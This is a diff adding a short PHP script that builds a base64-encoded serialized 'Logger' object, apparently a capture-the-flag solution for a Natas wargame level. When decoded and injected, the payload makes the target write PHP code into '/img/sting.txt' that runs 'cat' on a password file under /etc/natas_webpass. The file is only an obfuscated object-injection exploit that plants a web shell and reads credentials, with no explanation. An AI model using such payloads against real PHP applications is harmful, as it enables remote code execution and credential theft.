@@ -1,0 +1,6 @@
+<?php
+
+$drawing=unserialize(base64_decode("Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiL2ltZy9zdGluZy50eHQiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoxMDoiR290Y2hhICEhCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjU2OiI8P3BocCBlY2hvIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+CiI7fQ=="));
+print_r($drawing);
+
+?>
